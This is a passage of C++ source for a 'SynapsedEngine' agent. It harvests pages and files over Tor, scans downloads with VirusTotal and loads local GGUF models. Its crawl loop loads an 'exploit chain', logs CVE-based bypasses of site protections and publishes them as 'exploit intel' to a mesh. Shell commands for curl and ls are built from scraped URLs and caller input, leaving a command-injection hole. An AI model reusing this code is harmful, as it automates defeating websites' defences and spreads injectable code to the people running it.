    for (size_t i = 0; i < html.size(); i++) {
        if (html[i] != '<') continue;
        size_t tagEnd = html.find('>', i);
        if (tagEnd == std::string::npos) break;
        std::string tag = html.substr(i, tagEnd - i + 1);
        std::string tagLow;
        tagLow.reserve(tag.size());
        for (char c : tag) tagLow += static_cast<char>(std::tolower(c));

        if (tagLow.find("<img") == 0) {
            std::string src = extractAttr(tag, "src");
            if (!src.empty() && src.find("data:") != 0) {
                urls.push_back(resolveUrl(src));
            }
        }
        if (tagLow.find("<meta") != std::string::npos &&
            (tagLow.find("og:image") != std::string::npos ||
             tagLow.find("twitter:image") != std::string::npos)) {
            std::string content = extractAttr(tag, "content");
            if (!content.empty()) urls.push_back(resolveUrl(content));
        }
        if (tagLow.find("<a") == 0) {
            std::string href = extractAttr(tag, "href");
            if (!href.empty()) {
                std::string hrefLow;
                for (char c : href) hrefLow += static_cast<char>(std::tolower(c));
                for (const auto& ext : fileExts) {
                    if (hrefLow.size() >= ext.size() &&
                        hrefLow.substr(hrefLow.size() - ext.size()) == ext) {
                        urls.push_back(resolveUrl(href));
                        break;
                    }
                }
            }
        }
        i = tagEnd;
    }

    std::vector<std::string> unique;
    std::unordered_map<std::string, bool> seen;
    for (const auto& u : urls) {
        if (!seen[u] && unique.size() < 10) {
            seen[u] = true;
            unique.push_back(u);
        }
    }

    std::string assetsDir = dataDir_ + "/knowledge/assets";
    SYSTEM_IGNORE(("mkdir -p " + assetsDir).c_str());
    bool isOnion = baseUrl.find(".onion") != std::string::npos;
    int downloaded = 0;

    for (const auto& u : unique) {
        if (downloaded >= 5) break;
        std::string localPath = downloadAsset(u, isOnion, assetsDir);
        if (localPath.empty()) continue;
        downloaded++;

        std::ifstream check(localPath, std::ios::binary | std::ios::ate);
        if (!check.good()) continue;
        size_t fsize = check.tellg();
        check.seekg(0);
        std::string content((std::istreambuf_iterator<char>(check)),
                            std::istreambuf_iterator<char>());

        std::string sha = sha256Hex(content);

        std::string ext;
        size_t dotP = localPath.rfind('.');
        if (dotP != std::string::npos) ext = localPath.substr(dotP);

        std::string finalPath = assetsDir + "/" + sha + ext;
        if (localPath != finalPath) {
            std::rename(localPath.c_str(), finalPath.c_str());
        }

        std::string mime = "application/octet-stream";
        if (ext == ".png") mime = "image/png";
        else if (ext == ".jpg" || ext == ".jpeg") mime = "image/jpeg";
        else if (ext == ".gif") mime = "image/gif";
        else if (ext == ".webp") mime = "image/webp";
        else if (ext == ".svg") mime = "image/svg+xml";
        else if (ext == ".pdf") mime = "application/pdf";
        else if (ext == ".zip") mime = "application/zip";
        else if (ext == ".csv") mime = "text/csv";
        else if (ext == ".txt") mime = "text/plain";

        std::string verdict = vtScanFile(sha, finalPath);

        if (verdict.find("malicious") != std::string::npos) {
            std::string quarDir = dataDir_ + "/knowledge/quarantine";
            SYSTEM_IGNORE(("mkdir -p " + quarDir).c_str());
            std::rename(finalPath.c_str(), (quarDir + "/" + sha + ext).c_str());
            finalPath = quarDir + "/" + sha + ext;
        }

        HarvestAsset asset;
        asset.localPath = finalPath;
        asset.sha256 = sha;
        asset.mimeGuess = mime;
        asset.bytes = fsize;
        asset.vtVerdict = verdict;
        payload.assets.push_back(asset);
    }

    return payload;
}

std::string SynapsedEngine::downloadAsset(const std::string& url, bool isOnion,
    const std::string& assetsDir) const {
    (void)isOnion;
    if (url.empty() || !isUrlSafe(url)) return "";

    std::string ext;
    size_t qPos = url.rfind('?');
    std::string cleanUrl = qPos != std::string::npos ? url.substr(0, qPos) : url;
    size_t dotPos = cleanUrl.rfind('.');
    size_t slashPos = cleanUrl.rfind('/');
    if (dotPos != std::string::npos && (slashPos == std::string::npos || dotPos > slashPos)) {
        ext = cleanUrl.substr(dotPos);
        if (ext.size() > 6) ext = ".bin";
    } else {
        ext = ".bin";
    }

    std::string tmpPath = assetsDir + "/dl_" + std::to_string(nowMillis()) + ext;
    std::string cmd = "curl -s -k --max-time 30 --max-filesize 10485760 "
        + socks5Arg() + " -L -o \"" + tmpPath + "\" "
        "-H \"User-Agent: " + randomUserAgent() + "\" "
        "\"" + url + "\" 2>/dev/null";
    SYSTEM_IGNORE(cmd.c_str());

    std::ifstream check(tmpPath, std::ios::binary | std::ios::ate);
    if (!check.good() || check.tellg() == 0) {
        std::remove(tmpPath.c_str());
        return "";
    }
    size_t fileSize = check.tellg();
    check.close();

    if (fileSize > 10 * 1024 * 1024) {
        std::remove(tmpPath.c_str());
        return "";
    }

    if (ext == ".jpg" || ext == ".jpeg" || ext == ".png" ||
        ext == ".gif" || ext == ".webp") {
        std::fstream img(tmpPath, std::ios::in | std::ios::out | std::ios::binary);
        if (img.good()) {
            char header[12];
            img.read(header, 12);
            if (img.gcount() >= 12) {
                bool hasExif = (header[0] == '\xFF' && header[1] == '\xD8' &&
                               header[2] == '\xFF' && header[3] == '\xE1');
                if (hasExif) {
                    img.seekp(2);
                    char blank[2] = {'\xFF', '\xE0'};
                    img.write(blank, 2);
                }
            }
            img.close();
        }
    }

    return tmpPath;
}

std::string SynapsedEngine::vtScanFile(const std::string& sha256,
    const std::string& filePath) const {
    if (!vtApiKeyLoaded_) {
        std::string cfgPath = dataDir_ + "/config.toml";
        std::ifstream cfg(cfgPath);
        if (cfg.good()) {
            std::string line;
            while (std::getline(cfg, line)) {
                size_t p = line.find("vt_api_key");
                if (p != std::string::npos) {
                    size_t eq = line.find('=', p);
                    if (eq != std::string::npos) {
                        std::string val = line.substr(eq + 1);
                        size_t q1 = val.find('"');
                        size_t q2 = val.rfind('"');
                        if (q1 != std::string::npos && q2 > q1) {
                            vtApiKey_ = val.substr(q1 + 1, q2 - q1 - 1);
                        } else {
                            size_t start = val.find_first_not_of(" \t");
                            size_t end = val.find_last_not_of(" \t\n\r");
                            if (start != std::string::npos)
                                vtApiKey_ = val.substr(start, end - start + 1);
                        }
                    }
                }
            }
        }
        vtApiKeyLoaded_ = true;
    }

    if (vtApiKey_.empty()) return "unchecked";

    std::string cmd = "curl -s --max-time 10 "
        "-H \"x-apikey: " + vtApiKey_ + "\" "
        "\"https://www.virustotal.com/api/v3/files/" + sha256 + "\" 2>/dev/null";
    std::string resp = execCmd(cmd);

    if (resp.empty()) return "unchecked";

    if (resp.find("\"NotFoundError\"") != std::string::npos) return "unknown";

    size_t malP = resp.find("\"malicious\"");
    if (malP != std::string::npos) {
        size_t colon = resp.find(':', malP);
        if (colon != std::string::npos) {
            int count = std::atoi(resp.c_str() + colon + 1);
            if (count > 0) return "malicious:" + std::to_string(count);
            return "clean";
        }
    }

    return "unchecked";
}

void SynapsedEngine::persistHarvest(const NaanDraft& d, const std::string& hash,
    const HarvestPayload& payload) const {
    std::string dir = dataDir_ + "/knowledge";
    SYSTEM_IGNORE(("mkdir -p " + dir).c_str());
    std::string hash12 = hash.size() >= 12 ? hash.substr(0, 12) : hash;
    std::string fname = dir + "/harvest_" + std::to_string(nowMillis()) + "_" + hash12 + ".json";
    std::ofstream f(fname);
    if (!f) return;

    BypassReport br;
    {
        std::lock_guard<std::mutex> lock(bypassMtx_);
        br = lastBypass_;
    }

    std::string nodeHash = sha256Hex(nodeId_);

    f << "{\n"
      << "  \"draft_sha256\": \"" << hash << "\",\n"
      << "  \"topic\": \"" << jsonEscape(d.topic) << "\",\n"
      << "  \"title\": \"" << jsonEscape(d.title) << "\",\n"
      << "  \"text\": \"" << jsonEscape(payload.text.substr(0, 50000)) << "\",\n"
      << "  \"bypass\": {\n"
      << "    \"cve\": \"" << jsonEscape(br.cveId) << "\",\n"
      << "    \"protection\": \"" << jsonEscape(br.protectionType) << "\",\n"
      << "    \"method\": \"" << jsonEscape(br.bypassMethod) << "\",\n"
      << "    \"transport\": \"" << jsonEscape(br.transport) << "\",\n"
      << "    \"ttfb_ms\": " << static_cast<int64_t>(br.ttfbMs) << ",\n"
      << "    \"bytes\": " << br.bytes << "\n"
      << "  },\n"
      << "  \"assets\": [\n";
    for (size_t i = 0; i < payload.assets.size(); i++) {
        const auto& a = payload.assets[i];
        f << "    {\"sha256\":\"" << a.sha256
          << "\",\"mime\":\"" << jsonEscape(a.mimeGuess)
          << "\",\"bytes\":" << a.bytes
          << ",\"vt\":\"" << jsonEscape(a.vtVerdict)
          << "\",\"file\":\"" << jsonEscape(a.localPath) << "\"}";
        if (i + 1 < payload.assets.size()) f << ",";
        f << "\n";
    }
    f << "  ],\n"
      << "  \"node_id_hash\": \"" << nodeHash << "\",\n"
      << "  \"timestamp\": " << nowMillis() << "\n"
      << "}\n";
}

std::string SynapsedEngine::harvestList(int offset, int limit) const {
    std::string dir = dataDir_ + "/knowledge";
    std::string cmd = "ls -1t " + dir + "/harvest_*.json 2>/dev/null";
    std::string listing = execCmd(cmd);
    if (listing.empty()) return "[]";

    std::vector<std::string> files;
    std::istringstream iss(listing);
    std::string line;
    while (std::getline(iss, line)) {
        if (!line.empty()) files.push_back(line);
    }

    std::ostringstream out;
    out << "[";
    int written = 0;
    for (int i = offset; i < static_cast<int>(files.size()) && written < limit; i++) {
        std::ifstream f(files[i]);
        if (!f.good()) continue;
        std::string content((std::istreambuf_iterator<char>(f)),
                            std::istreambuf_iterator<char>());
        size_t textKey = content.find("\"text\"");
        if (textKey != std::string::npos) {
            size_t textStart = content.find('"', textKey + 6);
            if (textStart != std::string::npos) {
                size_t textEnd = textStart + 1;
                bool escaped = false;
                while (textEnd < content.size()) {
                    if (escaped) { escaped = false; textEnd++; continue; }
                    if (content[textEnd] == '\\') { escaped = true; textEnd++; continue; }
                    if (content[textEnd] == '"') break;
                    textEnd++;
                }
                std::string before = content.substr(0, textStart + 1);
                std::string text = content.substr(textStart + 1, textEnd - textStart - 1);
                std::string after = content.substr(textEnd);
                if (text.size() > 200) text = text.substr(0, 200) + "...";
                content = before + text + after;
            }
        }
        if (written > 0) out << ",";
        out << content;
        written++;
    }
    out << "]";
    return out.str();
}

std::string SynapsedEngine::harvestGet(const std::string& sha256) const {
    std::string dir = dataDir_ + "/knowledge";
    std::string pattern = "harvest_*" + sha256.substr(0, 12) + ".json";
    std::string cmd = "ls -1 " + dir + "/" + pattern + " 2>/dev/null | head -1";
    std::string path = execCmd(cmd);
    while (!path.empty() && (path.back() == '\n' || path.back() == '\r'))
        path.pop_back();
    if (path.empty()) return "{\"error\":\"not found\"}";

    std::ifstream f(path);
    if (!f.good()) return "{\"error\":\"read failed\"}";
    std::string content((std::istreambuf_iterator<char>(f)),
                        std::istreambuf_iterator<char>());
    return content;
}

bool SynapsedEngine::validateGguf(const std::string& path) const {
    std::ifstream f(path, std::ios::binary);
    if (!f) return false;
    char magic[4];
    f.read(magic, 4);
    return f.gcount() == 4 && magic[0] == 'G' && magic[1] == 'G' &&
           magic[2] == 'U' && magic[3] == 'F';
}

std::string SynapsedEngine::modelLoad(const std::string& paramsJson) {
    size_t pp = paramsJson.find("\"path\"");
    if (pp == std::string::npos) return "{\"error\":\"missing path\"}";
    size_t qs = paramsJson.find('"', pp + 6);
    if (qs == std::string::npos) return "{\"error\":\"bad json\"}";
    size_t qe = paramsJson.find('"', qs + 1);
    if (qe == std::string::npos) return "{\"error\":\"bad json\"}";
    std::string path = paramsJson.substr(qs + 1, qe - qs - 1);

    if (!validateGguf(path)) return "{\"error\":\"invalid GGUF file\"}";

    std::ifstream f(path, std::ios::ate | std::ios::binary);
    size_t sz = f.tellg();

    size_t slash = path.rfind('/');
    std::string name = (slash != std::string::npos) ? path.substr(slash + 1) : path;

    {
        std::lock_guard<std::mutex> lock(mtx_);
        modelLoaded_ = true;
        modelName_ = name;
        modelPath_ = path;
        modelSizeMb_ = sz / (1024 * 1024);
        inferenceReady_ = false;
    }

    bool inference = ensureLlamaLoaded();
    nlohmann::json out;
    out["ok"] = true;
    out["model"] = name;
    out["size_mb"] = modelSizeMb_;
    out["inference"] = inference;
    if (!inference) {
        out["note"] = "GGUF registered. llama.cpp did not load it into RAM; harvest still works.";
    }
    return out.dump();
}

std::string SynapsedEngine::modelUnloadRpc() {
    {
        std::lock_guard<std::mutex> llama(llamaMtx_);
        if (llamaEngine_ && llamaEngine_->isModelLoaded("desktop")) {
            llamaEngine_->unloadModel("desktop");
        }
        inferenceReady_ = false;
    }
    std::lock_guard<std::mutex> lock(mtx_);
    modelLoaded_ = false;
    modelName_ = "";
    modelPath_ = "";
    modelSizeMb_ = 0;
    return "{\"ok\":true}";
}

std::string SynapsedEngine::modelStatus() const {
    std::ostringstream ss;
    ss << "{\"loaded\":" << (modelLoaded_ ? "true" : "false")
       << ",\"inference\":" << (inferenceReady_ ? "true" : "false")
       << ",\"name\":\"" << jsonEscape(modelName_)
       << "\",\"path\":\"" << jsonEscape(modelPath_)
       << "\",\"size_mb\":" << modelSizeMb_ << "}";
    return ss.str();
}

std::string SynapsedEngine::naanStatus() const {
    BypassReport br;
    std::unordered_map<std::string, int> bcounts;
    {
        std::lock_guard<std::mutex> lock(bypassMtx_);
        br = lastBypass_;
        bcounts = bypassCounters_;
    }
    std::ostringstream ss;
    ss << "{\"state\":\"" << naanState_
       << "\",\"submissions\":" << naanSubmissions_
       << ",\"approved\":" << naanApproved_
       << ",\"total_ngt\":0"
       << ",\"budget_remaining\":" << (naanBudgetPerEpoch_ - naanSpentThisEpoch_)
       << ",\"approval_rate\":" << (naanSubmissions_ > 0 ? (100.0 * naanApproved_ / naanSubmissions_) : 0.0)
       << ",\"last_bypass\":{\"cve\":\"" << jsonEscape(br.cveId)
       << "\",\"protection\":\"" << jsonEscape(br.protectionType)
       << "\",\"method\":\"" << jsonEscape(br.bypassMethod)
       << "\",\"transport\":\"" << jsonEscape(br.transport)
       << "\",\"ttfb_ms\":" << static_cast<int64_t>(br.ttfbMs)
       << ",\"http\":" << br.httpCode
       << ",\"bytes\":" << br.bytes
       << ",\"ts\":" << br.ts << "}"
       << ",\"bypass_counters\":{";
    bool firstBc = true;
    for (const auto& kv : bcounts) {
        if (!firstBc) ss << ",";
        firstBc = false;
        ss << "\"" << jsonEscape(kv.first) << "\":" << kv.second;
    }
    ss << "}"
       << ",\"log\":[";
    for (size_t i = 0; i < naanLog_.size(); i++) {
        if (i) ss << ",";
        ss << "{\"ts\":" << naanLog_[i].ts << ",\"text\":\"" << jsonEscape(naanLog_[i].text) << "\"}";
    }
    ss << "],\"history\":[";
    for (size_t i = 0; i < naanHist_.size(); i++) {
        if (i) ss << ",";
        ss << "{\"title\":\"" << jsonEscape(naanHist_[i].title)
           << "\",\"topic\":\"" << naanHist_[i].topic
           << "\",\"status\":\"" << naanHist_[i].status
           << "\",\"ngt\":" << naanHist_[i].ngt << "}";
    }
    ss << "]"
       << ",\"current_task\":\"" << jsonEscape(naanRunning_.load() ? naanCurrentTask_ : std::string("")) << "\""
       << ",\"config\":{\"topics\":\"";
    for (size_t i = 0; i < cfgTopics_.size(); i++) {
        if (i) ss << ", ";
        ss << cfgTopics_[i];
    }
    ss << "\",\"sources\":\"" << jsonEscape(cfgSources_) << "\""
       << ",\"tick_interval\":" << naanTickInterval_
       << ",\"budget_limit\":\"" << std::fixed << naanBudgetPerEpoch_ << "\"}"
       << ",\"model_loaded\":" << (modelLoaded_ ? "true" : "false")
       << ",\"inference\":" << (inferenceReady_ ? "true" : "false")
       << ",\"model_name\":\"" << jsonEscape(modelName_) << "\""
       << "}";
    return ss.str();
}

std::string SynapsedEngine::naanControl(const std::string& paramsJson) {
    if (paramsJson.find("\"start\"") != std::string::npos ||
        paramsJson.find("\"action\":\"start\"") != std::string::npos) {
        if (naanStop_.load() && naanRunning_.load())
            return "{\"error\":\"still stopping\"}";
        startNaan();
        return "{\"ok\":true,\"state\":\"active\"}";
    }
    if (paramsJson.find("\"stop\"") != std::string::npos ||
        paramsJson.find("\"action\":\"stop\"") != std::string::npos) {
        if (!naanRunning_.load())
            return "{\"ok\":true,\"state\":\"off\"}";
        stopNaan();
        return "{\"ok\":true,\"state\":\"stopping\"}";
    }
    if (paramsJson.find("\"topics\"") != std::string::npos) {
        std::lock_guard<std::mutex> lock(mtx_);
        cfgTopics_.clear();
        size_t arr = paramsJson.find('[');
        size_t arre = paramsJson.find(']', arr);
        if (arr != std::string::npos && arre != std::string::npos) {
            std::string sub = paramsJson.substr(arr + 1, arre - arr - 1);
            size_t p = 0;
            while (true) {
                size_t q1 = sub.find('"', p);
                if (q1 == std::string::npos) break;
                size_t q2 = sub.find('"', q1 + 1);
                if (q2 == std::string::npos) break;
                cfgTopics_.push_back(sub.substr(q1 + 1, q2 - q1 - 1));
                p = q2 + 1;
            }
        }
        return "{\"ok\":true}";
    }
    if (paramsJson.find("\"tick\"") != std::string::npos) {
        std::lock_guard<std::mutex> lock(mtx_);
        size_t vp = paramsJson.find("\"tick\"");
        size_t colon = paramsJson.find(':', vp);
        if (colon != std::string::npos) {
            int v = std::atoi(paramsJson.c_str() + colon + 1);
            if (v >= 5 && v <= 600) naanTickInterval_ = v;
        }
        return "{\"ok\":true,\"tick\":" + std::to_string(naanTickInterval_) + "}";
    }
    if (paramsJson.find("\"budget\"") != std::string::npos) {
        std::lock_guard<std::mutex> lock(mtx_);
        size_t vp = paramsJson.find("\"budget\"");
        size_t colon = paramsJson.find(':', vp);
        if (colon != std::string::npos) {
            double v = std::atof(paramsJson.c_str() + colon + 1);
            if (v > 0) naanBudgetPerEpoch_ = v;
        }
        return "{\"ok\":true}";
    }
    return "{\"error\":\"unknown naan action\"}";
}

void SynapsedEngine::loadNaanWebConfig() {
    cfgSources_ = "tor";
    std::ifstream in(dataDir_ + "/naan_agent_web.conf");
    if (!in.good()) return;
    std::string line;
    bool leftover = false;
    while (std::getline(in, line)) {
        auto pos = line.find("naan_auto_search_mode=");
        if (pos == std::string::npos) continue;
        std::string v = line.substr(pos + 22);
        while (!v.empty() && (v.back() == '\r' || v.back() == ' ')) v.pop_back();
        if (v != "tor") leftover = true;
    }
    if (leftover) persistNaanSources();
}

void SynapsedEngine::persistNaanSources() const {
    const std::string path = dataDir_ + "/naan_agent_web.conf";
    std::ifstream in(path);
    std::vector<std::string> lines;
    bool found = false;
    if (in.good()) {
        std::string line;
        while (std::getline(in, line)) {
            if (line.find("naan_auto_search_mode=") == 0) {
                lines.push_back("naan_auto_search_mode=" + cfgSources_);
                found = true;
            } else {
                lines.push_back(line);
            }
        }
    }
    if (!found) lines.push_back("naan_auto_search_mode=" + cfgSources_);
    std::ofstream out(path, std::ios::trunc);
    if (!out.good()) return;
    for (const auto& l : lines) out << l << "\n";
}

void SynapsedEngine::startNaan() {
    if (naanRunning_.load()) return;
    if (naanThread_.joinable()) naanThread_.join();
    naanStop_.store(false);
    naanSpentThisEpoch_ = 0.0;
    {
        std::lock_guard<std::mutex> lock(mtx_);
        naanState_ = "active";
    }
    naanRunning_.store(true);
    if (!modelPath_.empty()) {
        std::thread([this]() { ensureLlamaLoaded(); }).detach();
    }
    naanThread_ = std::thread(&SynapsedEngine::naanLoop, this);
}

void SynapsedEngine::stopNaan() {
    naanStop_.store(true);
    std::lock_guard<std::mutex> lock(mtx_);
    if (naanRunning_.load()) naanState_ = "stopping";
    else naanState_ = "off";
}

void SynapsedEngine::naanLoop() {
    static std::mt19937 rng(std::random_device{}());

    loadExploitChain();

    while (!naanStop_.load()) {
        std::string topic;
        int tickSec;
        double budgetLeft;
        std::string sources = "tor";
        {
            std::lock_guard<std::mutex> lock(mtx_);
            if (cfgTopics_.empty()) { naanState_ = "cooldown"; break; }
            budgetLeft = naanBudgetPerEpoch_ - naanSpentThisEpoch_;
            if (budgetLeft <= 0) { naanState_ = "budget_exhausted"; break; }
            std::uniform_int_distribution<size_t> td(0, cfgTopics_.size() - 1);
            topic = cfgTopics_[td(rng)];
            tickSec = naanTickInterval_;
            sources = cfgSources_;
        }

        std::string url = topicToUrl(topic);
        if (sources == "tor" && url.find(".onion") == std::string::npos) {
            std::string q = topic;
            for (char& c : q) if (c == ' ') c = '+';
            url = "http://juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd.onion/search/?q=" + q;
        }
        bool isOnion = url.find(".onion") != std::string::npos;
        {
            std::lock_guard<std::mutex> lock(mtx_);
            naanCurrentTask_ = "fetching [" + topic + "] via " + (isOnion ? "tor" : "clearnet");
            NaanLogEntry fetchLog{nowMillis(), ">> fetching [" + topic + "] " + (isOnion ? "onion" : "clearnet")};
            naanLog_.push_back(fetchLog);
            if (naanLog_.size() > 80) naanLog_.erase(naanLog_.begin());
        }
        std::string html = fetchWithRetry(url, 3);
        if (naanStop_.load()) break;

        BypassReport br;
        {
            std::lock_guard<std::mutex> lock(bypassMtx_);
            br = lastBypass_;
        }

        std::string fetchedVia;
        if (html.empty()) fetchedVia = "failed";
        else if (isOnion) fetchedVia = "tor_socks5";
        else fetchedVia = "clearnet";

        std::vector<std::string> titles;
        if (!html.empty()) titles = extractTitles(html);

        {
            std::lock_guard<std::mutex> lock(mtx_);
            if (html.empty()) {
                naanCurrentTask_ = "fetch failed [" + topic + "]";
            } else {
                naanCurrentTask_ = "extracted " + std::to_string(titles.size()) + " entries from [" + topic + "]";
            }
        }

        std::string chosenTitle;
        if (!titles.empty()) {
            std::uniform_int_distribution<size_t> pick(0, titles.size() - 1);
            chosenTitle = titles[pick(rng)];
        } else {
            chosenTitle = "Advances in " + topic + " (fetch failed)";
            fetchedVia = "failed";
        }

        std::string payload = topic + "|" + chosenTitle + "|" +
            br.cveId + "|" + std::to_string(nowMillis());
        std::string hash = sha256Hex(payload);
        std::string sig = ed25519Sign(hash);

        const bool filed = !html.empty() && !titles.empty();
        const std::string status = filed ? "draft" : "fetch_failed";

        {
            std::lock_guard<std::mutex> lock(mtx_);

            if (filed) {
                if (naanSpentThisEpoch_ + 1.0 > naanBudgetPerEpoch_) {
                    naanState_ = "budget_exhausted";
                    break;
                }
                naanSpentThisEpoch_ += 1.0;
            }

            naanSubmissions_++;
            if (filed) {
                naanApproved_++;
            }

            std::string bypassTag;
            if (!br.cveId.empty() && !html.empty()) {
                bypassTag = " cve=" + br.cveId +
                            " prot=" + br.protectionType +
                            " method=" + br.bypassMethod +
                            " ttfb=" + std::to_string(static_cast<int64_t>(br.ttfbMs)) + "ms" +
                            " bytes=" + std::to_string(br.bytes);
            }
            NaanLogEntry le{nowMillis(),
                "[" + topic + "] " + chosenTitle +
                " sha256=" + hash.substr(0, 12) +
                " sig=" + sig.substr(0, 16) +
                " via=" + fetchedVia +
                bypassTag +
                " -> " + status};
            naanLog_.push_back(le);
            if (naanLog_.size() > 80) naanLog_.erase(naanLog_.begin());

            NaanDraft d{chosenTitle, topic, status, 0.0};
            naanHist_.push_back(d);
            if (naanHist_.size() > 25) naanHist_.erase(naanHist_.begin());

            if (filed) persistDraft(d, hash);
            naanState_ = "active";

            if (!br.cveId.empty() && !html.empty()) {
                ExploitIntel intel;
                intel.cveId = br.cveId;
                intel.protectionType = br.protectionType;
                intel.bypassMethod = br.bypassMethod;
                intel.transport = br.transport;
                intel.confidence = 0.85;
                intel.discoveredBy = sha256Hex(nodeId_);
                intel.timestamp = nowMillis();
                intel.successCount = 1;
                intel.failCount = 0;
                intel.signature = sha256Hex(br.cveId + br.bypassMethod +
                    std::to_string(intel.timestamp));
                publishExploit(intel);
            }
        }

        if (filed) {
            auto harvest = extractAssets(html, url);
            NaanDraft hd{chosenTitle, topic, status, 0.0};
            persistHarvest(hd, hash, harvest);
        }

        for (int w = 0; w < tickSec && !naanStop_.load(); w++) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    std::lock_guard<std::mutex> lock(mtx_);
    naanState_ = "off";
    naanRunning_.store(false);
}

void SynapsedEngine::applyDesktopConfig() {
    auto takeModelPath = [this](const std::string& path) {
        if (path.empty() || !validateGguf(path)) return;
        std::ifstream f(path, std::ios::ate | std::ios::binary);
        if (!f.good()) return;
        size_t sz = static_cast<size_t>(f.tellg());
        size_t slash = path.rfind('/');
        modelName_ = (slash != std::string::npos) ? path.substr(slash + 1) : path;
        modelPath_ = path;
        modelSizeMb_ = sz / (1024 * 1024);
        modelLoaded_ = true;
        inferenceReady_ = false;
    };

    if (!configPath_.empty()) {
        std::ifstream cfg(configPath_);
        std::string line;
        while (cfg.good() && std::getline(cfg, line)) {
            auto pos = line.find("model_path");
            if (pos != std::string::npos) {
                auto q1 = line.find('"', pos);
                auto q2 = line.rfind('"');
                if (q1 != std::string::npos && q2 > q1) {
                    takeModelPath(line.substr(q1 + 1, q2 - q1 - 1));
                }
            }
        }
    }

    std::ifstream sf(dataDir_ + "/settings.json");
    if (sf.good()) {
        std::string content((std::istreambuf_iterator<char>(sf)),
                             std::istreambuf_iterator<char>());
        nlohmann::json j = nlohmann::json::parse(content, nullptr, false);
        if (!j.is_discarded() && j.is_object()) {
            if (j.contains("model_path") && j["model_path"].is_string()) {
                takeModelPath(j["model_path"].get<std::string>());
            }
            if (j.contains("naan_topics") && j["naan_topics"].is_string()) {
                auto topics = parseTopicCsv(j["naan_topics"].get<std::string>());
                if (!topics.empty()) cfgTopics_ = topics;
            }
            if (j.contains("profile_alias") && j["profile_alias"].is_string())
                profileAlias_ = j["profile_alias"].get<std::string>();
            loadLocalProfile();
            if (j.contains("connection_type") && j["connection_type"].is_string()) {
                const std::string ct = j["connection_type"].get<std::string>();
                if (ct != "tor" && ct != "tor_bridges") {
                    j["connection_type"] = "tor";
                    std::ofstream out(dataDir_ + "/settings.json", std::ios::trunc);
                    if (out.good()) out << j.dump();
                }
                cfgSources_ = "tor";
            }
        }
    }
    if (profileAvatarDataUrl_.empty() && profileAlias_.empty()) loadLocalProfile();
}

std::string SynapsedEngine::modelCatalogJson() const {
    nlohmann::json arr = nlohmann::json::array();
    std::string modelsDir = dataDir_ + "/models";
    for (const auto& o : kGgufCatalog) {
        std::string dest = modelsDir + "/" + o.filename;
        bool installed = validateGguf(dest);
        nlohmann::json row;
        row["id"] = o.id;
        row["name"] = o.name;
        row["filename"] = o.filename;
        row["url"] = o.url;
        row["size_bytes"] = o.sizeBytes;
        row["ram_mb"] = o.ramMb;
        row["note"] = o.note;
        row["installed"] = installed;
        row["path"] = installed ? dest : "";
        arr.push_back(std::move(row));
    }
    {
        std::error_code ec;
        if (std::filesystem::exists(modelsDir, ec)) {
            for (const auto& ent : std::filesystem::directory_iterator(modelsDir, ec)) {
                if (!ent.is_regular_file(ec)) continue;
                auto pth = ent.path();
                if (pth.extension() != ".gguf") continue;
                std::string dest = pth.string();
                bool known = false;
                for (const auto& o : kGgufCatalog) {
                    if (modelsDir + "/" + o.filename == dest) {
                        known = true;
                        break;
                    }
                }
                if (known) continue;
                if (!validateGguf(dest)) continue;
                nlohmann::json row;
                row["id"] = std::string("local:") + pth.filename().string();
                row["name"] = pth.filename().string();
                row["filename"] = pth.filename().string();
                row["url"] = "";
                row["size_bytes"] = static_cast<uint64_t>(ent.file_size(ec));
                row["ram_mb"] = 0;
                row["note"] = "Local GGUF in ~/.synapsenet/models";
                row["installed"] = true;
                row["path"] = dest;
                arr.push_back(std::move(row));
            }
        }
    }
    nlohmann::json out;
    out["models"] = arr;
    out["dir"] = modelsDir;
    out["via_default"] = "direct";
    out["note"] = "Catalog files download from HuggingFace over HTTPS. Mesh traffic stays on Tor. Harvest works without a GGUF; IDE chat and hard captchas need one.";
    return out.dump();
}

std::string SynapsedEngine::modelDownloadStart(const std::string& paramsJson) {
    nlohmann::json p = nlohmann::json::parse(paramsJson, nullptr, false);
    std::string id;
    bool viaTor = false;
    if (!p.is_discarded() && p.is_object()) {
        if (p.contains("id") && p["id"].is_string()) id = p["id"].get<std::string>();
        if (p.contains("via") && p["via"].is_string() && p["via"].get<std::string>() == "tor")
            viaTor = true;
    }
    if (id.empty()) return "{\"error\":\"missing id\"}";
    const GgufOffer* offer = findGgufOffer(id);
    if (!offer) return "{\"error\":\"unknown model id\"}";

    std::error_code ec;
    std::string modelsDir = dataDir_ + "/models";
    std::filesystem::create_directories(modelsDir, ec);
    std::string dest = modelsDir + "/" + offer->filename;

    if (validateGguf(dest)) {
        nlohmann::json loadParams;
        loadParams["path"] = dest;
        std::string loaded = modelLoad(loadParams.dump());
        nlohmann::json out = nlohmann::json::parse(loaded, nullptr, false);
        if (out.is_discarded()) out = nlohmann::json::object();
        out["already"] = true;
        out["path"] = dest;
        out["id"] = id;
        return out.dump();
    }

    {
        std::lock_guard<std::mutex> dl(modelDlMtx_);
        if (modelDl_.running) return "{\"error\":\"download already running\"}";
        modelDlStop_.store(false);
        modelDl_ = ModelDlState{};
        modelDl_.id = id;
        modelDl_.filename = offer->filename;
        modelDl_.path = dest;
        modelDl_.total = offer->sizeBytes;
        modelDl_.running = true;
        modelDl_.viaTor = viaTor;
    }
    if (modelDlThread_.joinable()) modelDlThread_.join();
    std::string url = offer->url;
    uint64_t expected = offer->sizeBytes;
    modelDlThread_ = std::thread([this, id, url, dest, expected, viaTor]() {
        modelDownloadLoop(id, url, dest, expected, viaTor);
    });
    nlohmann::json out;
    out["ok"] = true;
    out["id"] = id;
    out["path"] = dest;
    out["size_bytes"] = offer->sizeBytes;
    out["via"] = viaTor ? "tor" : "direct";
    return out.dump();
}

std::string SynapsedEngine::modelDownloadStatusJson() const {
    ModelDlState snap;
    {
        std::lock_guard<std::mutex> dl(modelDlMtx_);
        snap = modelDl_;
    }
    if (snap.running && !snap.path.empty()) {
        uint64_t live = fileSizeOr0(snap.path + ".partial");
        if (live == 0) live = fileSizeOr0(snap.path);
        snap.bytes = live;
    }
    uint64_t pct = 0;
    if (snap.total > 0) {
        pct = (snap.bytes * 100ull) / snap.total;
        if (pct > 99 && snap.running) pct = 99;
        if (snap.done && !snap.failed) pct = 100;
    }
    nlohmann::json out;
    out["id"] = snap.id;
    out["filename"] = snap.filename;
    out["path"] = snap.path;
    out["bytes"] = snap.bytes;
    out["total"] = snap.total;
    out["pct"] = pct;
